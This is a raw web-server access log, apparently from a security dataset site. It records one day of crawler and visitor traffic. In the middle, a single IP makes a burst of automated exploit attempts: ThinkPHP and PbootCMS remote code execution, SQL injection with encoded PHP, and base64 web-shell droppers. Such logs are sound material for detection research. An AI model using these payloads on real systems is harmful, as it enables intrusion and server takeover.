114.119.149.81 - - [11/Jan/2022:02:44:31 -0800] "GET /self.logs/2015/error.log.2015-11-18.gz HTTP/1.1" 200 1067 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
122.182.248.208 - - [11/Jan/2022:17:06:52 -0800] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
122.182.248.208 - - [11/Jan/2022:17:06:53 -0800] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
122.182.248.208 - - [11/Jan/2022:17:06:53 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
122.182.248.208 - - [11/Jan/2022:17:06:53 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
122.182.248.208 - - [11/Jan/2022:17:06:54 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
114.119.149.71 - - [11/Jan/2022:17:07:52 -0800] "GET /self.logs/error.log.2017-04-28.gz HTTP/1.1" 200 959 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
122.182.248.208 - - [11/Jan/2022:17:08:09 -0800] "GET /scada/scada_logs.zip HTTP/1.1" 200 365012 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
157.55.39.6 - - [11/Jan/2022:17:12:31 -0800] "GET /self.logs/?C=D;O=A HTTP/1.1" 200 33907 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
17.121.114.93 - - [11/Jan/2022:17:13:00 -0800] "GET /self.logs/error.log.2020-01-31 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.121.114.182 - - [11/Jan/2022:17:17:13 -0800] "GET /self.logs/error.log.2020-06-18 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.121.113.9 - - [11/Jan/2022:17:17:57 -0800] "GET /self.logs/error.log.2020-09-14 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.121.113.77 - - [11/Jan/2022:17:25:06 -0800] "GET /self.logs/error.log.2020-07-04 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.121.112.2 - - [11/Jan/2022:17:28:07 -0800] "GET /self.logs/error.log.2020-02-22 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.121.114.150 - - [11/Jan/2022:17:29:14 -0800] "GET /self.logs/error.log.2020-06-28 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
114.119.149.81 - - [11/Jan/2022:17:30:34 -0800] "GET /self.logs/access.log.2017-02-10.gz HTTP/1.1" 200 36568 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
51.222.253.18 - - [11/Jan/2022:17:33:17 -0800] "GET /Datasets%20Description/?C=M;O=A HTTP/1.1" 200 633 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
114.119.149.81 - - [11/Jan/2022:17:36:14 -0800] "GET /self.logs/error.log.2019-02-10.gz HTTP/1.1" 200 4127 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
49.7.20.105 - - [11/Jan/2022:17:39:44 -0800] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.149.78 - - [11/Jan/2022:17:53:13 -0800] "GET /self.logs/access.log.2020-12-29.gz HTTP/1.1" 200 32563 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
220.181.41.13 - - [11/Jan/2022:17:55:44 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 304 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
17.121.114.119 - - [11/Jan/2022:17:58:12 -0800] "GET /self.logs/error.log.2020-07-05 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
51.222.253.3 - - [11/Jan/2022:18:07:31 -0800] "GET / HTTP/1.1" 200 13142 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
66.249.66.15 - - [11/Jan/2022:18:14:28 -0800] "GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1" 200 1651 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
49.7.20.105 - - [11/Jan/2022:18:15:23 -0800] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
85.208.98.200 - - [11/Jan/2022:18:21:12 -0800] "GET /robots.txt HTTP/1.1" 200 377 "-" "Mozilla/5.0 (compatible; SiteAuditBot/0.97; +http://www.semrush.com/bot.html)" 
85.208.98.200 - - [11/Jan/2022:18:21:12 -0800] "GET / HTTP/1.1" 200 13163 "-" "Mozilla/5.0 (compatible; SiteAuditBot/0.97; +http://www.semrush.com/bot.html)" 
51.222.253.18 - - [11/Jan/2022:18:21:39 -0800] "GET /Datasets%20Description/Network/weird.html HTTP/1.1" 200 1601 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
17.121.115.208 - - [11/Jan/2022:18:28:09 -0800] "GET /self.logs/error.log.2020-09-07 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.121.112.159 - - [11/Jan/2022:18:28:18 -0800] "GET /self.logs/error.log.2020-09-23 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
52.212.146.96 - - [11/Jan/2022:18:30:02 -0800] "GET /self.logs/access.log.2022-01-05.gz HTTP/1.1" 200 13217 "-" "python-requests/2.12.1" 
172.87.25.10 - - [11/Jan/2022:18:30:07 -0800] "POST /index.php/api/Uploadify/preview HTTP/1.1" 404 328 "http://www.secrepo.com/index.php/api/Uploadify/preview" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:07 -0800] "GET /user.php?act=login HTTP/1.1" 404 305 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:280:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a325175634768774a79776e50443977614841675a585a686243676b58314250553152625a5630704f79412f506d4669597963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:07 -0800] "GET /user.php?act=login HTTP/1.1" 404 305 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:289:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a325175634768774a79776e50443977614841675a585a686243676b58314250553152625a5630704f79412f506d4669597963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:07 -0800] "GET /d.php HTTP/1.1" 404 305 "http://www.secrepo.com/d.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:07 -0800] "GET /plus/moon.php HTTP/1.1" 404 305 "http://www.secrepo.com/plus/moon.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:07 -0800] "GET /plus/mytag_js.php?aid=9090 HTTP/1.1" 404 305 "http://www.secrepo.com/plus/mytag_js.php?aid=9090" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:08 -0800] "GET /type.php?template=tag_(){};@unlink(FILE);print_r(xbshell);assert($_POST[1]);{//../rss HTTP/1.1" 418 746 "http://www.secrepo.com/type.php?template=tag_(){};@unlink(FILE);print_r(xbshell);assert($_POST[1]);{//../rss" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:08 -0800] "GET /data/cache_template/rss.tpl.php HTTP/1.1" 404 305 "http://www.secrepo.com/data/cache_template/rss.tpl.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:09 -0800] "GET /?s=index/\\think\\template\\driver\\file/write&cacheFile=robots1.php&content=xbshell<?php%20@eval($_POST[admin]);?> HTTP/1.1" 418 746 "http://www.secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=robots1.php&content=xbshell<?php @eval($_POST[admin]);?>" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:09 -0800] "GET /robots1.php HTTP/1.1" 404 305 "http://www.secrepo.com/robots1.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:09 -0800] "GET /?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=<?php%20$poc%20=\"axsxsxexrxt\";$poc_1%20=%20explode(\"x\",%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST['12345']))));?> HTTP/1.1" 418 746 "http://www.secrepo.com/?" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:09 -0800] "GET /12345.php HTTP/1.1" 404 305 "http://www.secrepo.com/12345.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:09 -0800] "GET /?s=index/\\think\\template\\driver\\file/write&cacheFile=robots.php&content=xbshell1<?php$password%20=%20\"xinba\";$ch%20=%20explode(\".\",\"hello.ass.world.er.t\");array_intersect_ukey(array($_REQUEST[$password]%20=>%201),%20array(1),%20$ch[1].$ch[3].$ch[4]);?> HTTP/1.1" 418 746 "http://www.secrepo.com?s=index/\\think\\template\\driver\\file/write&cacheFile=robots.php&content=xbshell1<?php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:09 -0800] "GET /robots.php HTTP/1.1" 404 305 "http://www.secrepo.com/robots.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:09 -0800] "GET /?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET[%27fuck%27]);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz54YnNoZWxs)); HTTP/1.1" 418 746 "http://www.secrepo.com/?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET[%27fuck%27]);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz54YnNoZWxs));" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:09 -0800] "GET /x.php HTTP/1.1" 404 305 "http://www.secrepo.com/x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:10 -0800] "GET /index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUW2FkbWluXSk7Pz54YnNoZWxs HTTP/1.1" 404 305 "http://www.secrepo.com/index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUW2FkbWluXSk7Pz54YnNoZWxs" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:10 -0800] "GET /uploadfile/member/0/0x0.php HTTP/1.1" 404 305 "http://www.secrepo.com/uploadfile/member/0/0x0.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:10 -0800] "POST /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 305 "http://www.secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" 
172.87.25.10 - - [11/Jan/2022:18:30:10 -0800] "GET /index.php/list/5/?current={pboot:if(eval\\\\($_GET['a']))}1{/pboot:if}&a=fputs(fopen(base64_decode('eC5waHA'),'w'),%20base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWyd4YiddKTsgPz54YnNoZWxs')); HTTP/1.1" 418 746 "http://www.secrepo.com/index.php/list/5/?current={pboot:if(eval\\\\($_GET['a']))}1{/pboot:if}&a=fputs(fopen(base64_decode('eC5waHA'),'w'), base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWyd4YiddKTsgPz54YnNoZWxs'));" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:10 -0800] "GET /x.php HTTP/1.1" 404 305 "http://www.secrepo.com/x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:10 -0800] "GET /SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest HTTP/1.1" 404 305 "http://www.secrepo.com/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:10 -0800] "GET /SiteFiles/SiteTemplates/sectest/include.aspx HTTP/1.1" 404 305 "http://www.secrepo.com/SiteFiles/SiteTemplates/sectest/include.aspx" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:11 -0800] "POST /index.php?s=index HTTP/1.1" 404 305 "http://www.secrepo.com/index.php?s=index" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:11 -0800] "GET /admin_aspcms/_system/AspCms_SiteSetting.asp?action=saves\xe2\x80\x9d,%201,%20\xe2\x80\x9crunMode=1&siteMode=1&siteHelp=%B1%BE%CD%F8%D5%BE%D2%F2%B3%CC%D0%F2%C9%FD%BC%B6%B9%D8%B1%D5%D6%D0&SwitchComments=1&SwitchCommentsStatus=1&switchFaq=0:Y=request(chr(35)):execute(Y)&SwitchFaqStatus=0&dirtyStr=&waterMark=1&waterMarkFont=hahahaha&waterMarkLocation=1&smtp_usermail=aspcmstest%40163.com&smtp_user=aspcmstest&smtp_password=aspcms.cn&smtp_server=smtp.163.com&MessageAlertsEmail=13322712%40qq.com&messageReminded=1&orderReminded=1&applyReminded=1&commentReminded=1&LanguageID=1 HTTP/1.1" 404 305 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp?action=saves\xa1\xb1, 1, \xa1\xb0runMode=1&siteMode=1&siteHelp=%B1%BE%CD%F8%D5%BE%D2%F2%B3%CC%D0%F2%C9%FD%BC%B6%B9%D8%B1%D5%D6%D0&SwitchComments=1&SwitchCommentsStatus=1&switchFaq=0:Y=request(chr(35)):execute(Y)&SwitchFaqStatus=0&dirtyStr=&waterMark=1&waterMarkFont=hahahaha&waterMarkLocation=1&smtp_usermail=aspcmstest%40163.com&smtp_user=aspcmstest&smtp_password=aspcms.cn&smtp_server=smtp.163.com&MessageAlertsEmail=13322712%40qq.com&messageReminded=1&orderReminded=1&applyReminded=1&commentReminded=1&LanguageID=1" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:11 -0800] "POST /fckeditor/editor/filemanager/upload/php/upload.php?Type=Media HTTP/1.1" 404 269 "http://www.secrepo.com/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0" 
172.87.25.10 - - [11/Jan/2022:18:30:11 -0800] "GET /function/editor/php/upload_json.php?upload_file=aaa HTTP/1.1" 404 328 "http://www.secrepo.com/function/editor/php/upload_json.php?upload_file=aaa" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
172.87.25.10 - - [11/Jan/2022:18:30:11 -0800] "GET /client/manage/ourphp_filebox.php?op=home&folder=./&validation=&code= HTTP/1.1" 404 305 "http://www.secrepo.com/client/manage/ourphp_filebox.php?op=home&folder=./&validation=&code=" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
157.55.39.81 - - [11/Jan/2022:18:30:44 -0800] "GET /self.logs/access.log.2021-11-07.gz HTTP/1.1" 200 37318 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.81 - - [11/Jan/2022:18:34:24 -0800] "GET /self.logs/error.log.2018-11-17.gz HTTP/1.1" 200 4061 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
51.222.253.12 - - [11/Jan/2022:18:35:48 -0800] "GET /Datasets%20Description/?C=S;O=A HTTP/1.1" 200 633 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
134.175.216.41 - - [11/Jan/2022:18:38:48 -0800] "GET / HTTP/1.1" 301 438 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; TencentTraveler ; EmbeddedWB 14.52 from: http://www.bsalsa.com/ EmbeddedWB 14.52; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.590; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" 
49.7.20.105 - - [11/Jan/2022:18:51:15 -0800] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
123.125.109.43 - - [11/Jan/2022:18:51:28 -0800] "GET / HTTP/1.1" 301 438 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
17.121.113.198 - - [11/Jan/2022:18:51:30 -0800] "GET /self.logs/error.log.2020-11-11 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
51.222.253.8 - - [11/Jan/2022:18:51:30 -0800] "GET /Datasets%20Description/PE_malware/OPCleaver.html HTTP/1.1" 200 1414 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
207.46.13.186 - - [11/Jan/2022:18:51:45 -0800] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
17.121.113.190 - - [11/Jan/2022:18:51:56 -0800] "GET /self.logs/error.log.2020-02-14 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
114.119.149.71 - - [11/Jan/2022:18:54:55 -0800] "GET /self.logs/access.log.2017-07-24.gz HTTP/1.1" 200 35804 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
123.125.109.43 - - [11/Jan/2022:18:58:38 -0800] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
17.121.112.158 - - [11/Jan/2022:18:58:43 -0800] "GET /self.logs/error.log.2020-05-12 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
198.182.50.13 - - [11/Jan/2022:19:00:06 -0800] "GET /favicon.ico HTTP/1.1" 200 391 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36" 
17.121.115.107 - - [11/Jan/2022:19:05:02 -0800] "GET /self.logs/error.log.2020-05-22 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
51.222.253.7 - - [11/Jan/2022:19:08:01 -0800] "GET /Datasets%20Description/Network/notice.html HTTP/1.1" 200 1606 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
17.121.115.231 - - [11/Jan/2022:19:09:12 -0800] "GET /self.logs/error.log.2020-04-19 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.121.114.201 - - [11/Jan/2022:19:10:15 -0800] "GET /self.logs/error.log.2020-02-17 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
114.119.149.71 - - [11/Jan/2022:19:11:43 -0800] "GET /self.logs/access.log.2020-01-06.gz HTTP/1.1" 200 13902 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
17.121.115.32 - - [11/Jan/2022:19:13:22 -0800] "GET /self.logs/error.log.2020-10-01 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
104.192.108.9 - - [11/Jan/2022:19:19:25 -0800] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
104.192.108.9 - - [11/Jan/2022:19:19:25 -0800] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
104.192.108.10 - - [11/Jan/2022:19:19:25 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
104.192.108.9 - - [11/Jan/2022:19:19:25 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27893 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
